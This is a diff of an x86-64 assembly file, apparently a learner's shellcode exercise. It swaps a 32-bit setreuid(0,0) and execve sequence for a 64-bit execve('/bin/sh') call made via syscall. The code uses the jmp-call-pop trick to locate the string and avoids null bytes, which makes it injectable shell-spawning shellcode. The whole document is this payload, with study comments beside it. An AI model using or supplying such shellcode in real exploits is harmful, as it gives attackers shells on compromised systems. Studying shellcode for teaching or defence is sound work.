@@ -2,29 +2,26 @@
 .section .text
 .globl _start
 
-jmp put_addr_on_stack
-
-_start: # setreuid( 0, 0 ) --- run as root
-    xor %rax, %rax
-    mov $70, %al
-    xor %rbx, %rbx
-    xor %rcx, %rcx
-    int $0x80
+_start:
     jmp put_addr_on_stack
 
 prep_string:
-    pop %rbx
+    pop %rbx # %rbx now contains the address of "/bin/sh"
     xor %rax, %rax
     mov %al, 0x07(%rbx)  # N -> \0
     mov %rbx, 0x08(%rbx) # write addr to mem
     mov %rax, 0x10(%rbx) # write null to mem
 
-call_execve: # execve( "/bin/sh", NULL, NULL )
-    mov $0xff, %al
-    sub $0xf4, %al
-    lea 0x08(%rbx), %rcx
-    lea 0x10(%rbx), %rdx
-    int $0x80
+# execve( "/bin/sh", NULL, NULL )
+# compile a program calling execve statically, then check how execve works
+# basically execve( $rdi, $rsi, $rdx )
+call_execve:
+    xor %rax, %rax
+    mov $0x3b, %al # if we move to %rax directly we get null bytes
+    xor %rdx, %rdx
+    xor %rsi, %rsi
+    mov %rbx, %rdi
+    syscall
 
 put_addr_on_stack:
     call prep_string # this call puts the addr of string on stack
